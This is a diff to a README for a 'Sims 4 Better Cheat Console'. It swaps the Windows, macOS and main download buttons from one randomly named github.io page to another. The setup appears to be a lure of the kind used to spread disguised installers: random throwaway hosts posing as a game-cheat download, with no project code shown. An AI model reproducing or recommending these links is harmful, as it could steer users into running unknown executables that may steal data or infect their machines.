@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download The Sims 4 Better Cheat Console](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_THE_SIMS_4_BETTER_CHEAT_CONSOLE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download The Sims 4 Better Cheat Console](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_THE_SIMS_4_BETTER_CHEAT_CONSOLE-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **The Sims 4 Better Cheat Console** is quick and straightfo
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-E91E63?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-E91E63?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-E91E63?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-E91E63?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
 
 </div>
 
